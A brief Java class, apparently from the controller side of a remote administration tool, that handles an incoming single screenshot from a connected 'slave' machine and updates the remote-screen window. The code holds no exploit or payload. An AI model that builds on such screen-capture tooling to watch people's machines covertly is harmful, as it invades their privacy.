package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameRemoteScreen;

public class PacketSINGLEIMAGECOMING extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		PacketIMAGECOMING cl = new PacketIMAGECOMING();
		cl.requestAgain = false;
		cl.read(slave, line);
		
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		if (frame != null) {
			frame.running = false;
			frame.btnRequestOne.setEnabled(true);
		}
	}

}
